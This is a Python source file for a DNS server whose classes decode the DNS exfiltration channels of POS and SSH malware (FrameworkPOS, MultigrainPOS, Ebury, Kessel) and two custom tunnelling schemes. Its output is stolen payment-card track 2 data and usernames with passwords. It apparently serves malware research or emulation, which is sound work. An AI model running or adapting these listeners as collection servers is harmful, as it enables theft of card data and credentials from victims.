import socket
import base64
from math import log2
from bitstring import Bits
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
import dns.query
import dns.message

RESPONSE_ADDRESS = '' # fill with the address that should be sent as answer

class base:
    def __init__(self, respond=True, udp=True):
        self.sock = socket.socket(
            socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
        self.respond = respond
        self.udp = udp

    def s_udp(self):
        while True:
            msg, time, from_addr = dns.query.receive_udp(self.sock)
            if self.respond:
                resp = dns.message.make_response(msg)
                resp.answer.append(dns.rrset.from_text(
                    msg.question[0].name, 0, 1, 1, RESPONSE_ADDRESS))
                dns.query.send_udp(self.sock, resp, from_addr)
            try:
                self.process(msg)
            except Exception as e:
                print(f"Exception occured, skipping: {e}")

    def s_tcp(self):
        self.sock.listen()
        msg: dns.message.Message
        while True:
            conn, addr = self.sock.accept()
            with conn:
                msg, time = dns.query.receive_tcp(conn)
                if self.respond:
                    resp = dns.message.make_response(msg)
                    resp.additional.clear()
                    resp.answer.append(dns.rrset.from_text(
                        msg.question[0].name, 0, 1, 1, RESPONSE_ADDRESS))
                    dns.query.send_tcp(conn, resp)
            try:
                self.process(msg)
            except Exception as e:
                print(f"Exception occured, skipping: {e}")

    def __call__(self):
        self.sock.bind(('', 53))
        print('Ready.')
        if self.udp:
            self.s_udp()
        else:
            self.s_tcp()


class frameworkpos(base):

    def __init__(self, xor_key=0xf2, **kwargs):
        super().__init__(**kwargs)
        self.xor_key = xor_key

    def decode(self, text):
        return ''.join([chr(int(text[i:i+2], base=16) ^ self.xor_key) for i in range(0, len(text), 2)])

    def beacon(self, hostname, host_ip):
        print(
            f"target info: ip={self.decode(host_ip)} hostname={self.decode(hostname)}")

    def alert(self, proc_name, _):
        print(f"process name: {self.decode(proc_name)}")

    def card(self, card_num, card_info):
        print(
            f"track 2 data: ;{self.decode(card_num)}={self.decode(card_info)}?")

    def process(self, msg):
        text = msg.question[0].name.to_text().split('.')
        id = text[0]
        req_type = text[1]
        if req_type not in ['alert', 'beacon']:
            req_type = 'card'
            text = text[1:]
        else:
            text = text[2:]

        print(f"from id={id} received {req_type}:", end=' ')
        # call `beacon`, `alert` or `card` function
        self.__getattribute__(req_type)(text[0], text[1])


class multigrainpos(base):
    def __init__(self, private_key, **kwargs):
        super().__init__(**kwargs)
        self.private_key = private_key

    def decode(self, text):
        return base64.b32decode(text)

    def decrypt(self, ciphertext: bytes):
        return self.private_key.decrypt(
            ciphertext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

    def install(self, msg):
        print(f"received `install` from {msg[:8]} with data: {msg[8:]}")

    def log(self, msg):
        print(f"received track2 data: {self.decrypt(msg)}")

    def process(self, msg):
        text = msg.question[0].name.to_text().split('.')
        req_type = text[0]
        corrected = ''.join(text[1:-3])  # label correction
        decoded = self.decode(corrected)
        if req_type == 'install':
            self.install(decoded)
        elif req_type == 'log':
            self.log(decoded)


class ebury(base):
    def __init__(self, xor_key=0x000d5345, key_size=4, **kwargs):
        super().__init__(**kwargs)
        self.xor_key = xor_key
        self.key_size = key_size

    def decode(self, text):
        split_list = [text[i:i+2*self.key_size]
                      for i in range(0, len(text), 2*self.key_size)]

        def decrypt(hex_str):
            results = []
            length = len(hex_str) >> 1
            unhexed = int(hex_str, base=16)
            xored = unhexed ^ self.xor_key
            for _ in range(length):
                results.append(xored & 0xff)
                xored >>= 8
            results.reverse()
            return results
        return ''.join((chr(c) for hex_str in split_list for c in decrypt(hex_str)))

    def process(self, msg):
        text = msg.question[0].name.to_text().split('.', 1)
        creds = self.decode(text[0])
        cred_type = 'IN' if creds.count(':') == 1 else 'OUT'
        creds = creds.split(':')
        print(
            f"Received credential type {cred_type}. User: {creds[0]} | Password: {creds[1]}", end='')
        if cred_type == 'OUT':
            print(f" | Remote port: {creds[2]}")
        else:
            print()


class kessel(base):
    def __init__(self, respond=True, udp=True):
        super().__init__(respond, udp)
        self.encrypted_data = b''

    def decode(self, text: str):
        return bytes.fromhex(text)

    def decrypt(self, key: bytes, text: bytes):

        def KSA(key):
            S = list(range(256))
            j = 0
            for i in range(256):
                j = (j + S[i] + key[i % 4]) % 256
                S[i], S[j] = S[j], S[i]
            return S

        def PRGA(S):
            i = 0
            j = 0
            while True:
                i = (i + j) % 256
                j = (j + S[i]) % 256
                S[i], S[j] = S[j], S[i]
                yield S[(S[i] + S[j]) % 256]

        plaintext = b''.join([(c ^ k).to_bytes(1, 'little')
                             for c, k in zip(text, PRGA(KSA(key)))])
        return plaintext.decode()

    def process(self, msg):
        text = msg.question[0].name.to_text().split('.')[:-3]
        self.encrypted_data += self.decode(''.join(text))
        if self.encrypted_data[-1] == ord(b';'):  # received all data
            key = self.encrypted_data[-5:-1]
            decrypted = self.decrypt(key, self.encrypted_data[:-9])
            print(decrypted)
            self.encrypted_data = b''


class fastervec(base):
    def __init__(self, udp, respond=False):
        super().__init__(respond, udp)

    def decode(self, text: bytes):
        return base64.b64decode(text)

    def process(self, msg):
        innocent_string = msg.question[0].name.to_text().split('.', 1)[0]
        fin_list = [b'' for _ in range(len(msg.additional))]
        for answer in msg.additional:
            num = answer.name.to_text()[len(innocent_string):].split('.', 1)[0]
            fin_list[int(num)] = list(answer.items)[0].strings[0]
        to_dec = b''.join(fin_list)
        print(f"Received:\n{self.decode(to_dec).decode()}")


class stealthyvec(base):
    def __init__(self, domains, words):
        super().__init__()
        self.D = int(log2(len(domains)))
        self.W = int(log2(len(words)))
        self.domains = {}
        for i in range(len(domains)):
            self.domains[domains[i]] = i
        self.words = {}
        for i in range(len(words)):
            self.words[words[i]] = i
            UnicodeDecodeError
        self.prev = b''
    
    def process(self, msg):
        msg_split = msg.question[0].name.to_text().split('.')
        domain_bits = [Bits(uint=self.domains['.'.join(msg_split[-3:-1])], length=self.D)]
        words_bits = [Bits(uint=self.words[word], length=self.W) for word in msg_split[:-3]]
        codes = Bits().join(domain_bits + words_bits)
        msg_dec = codes.tobytes().decode('ASCII')
        print(msg_dec)
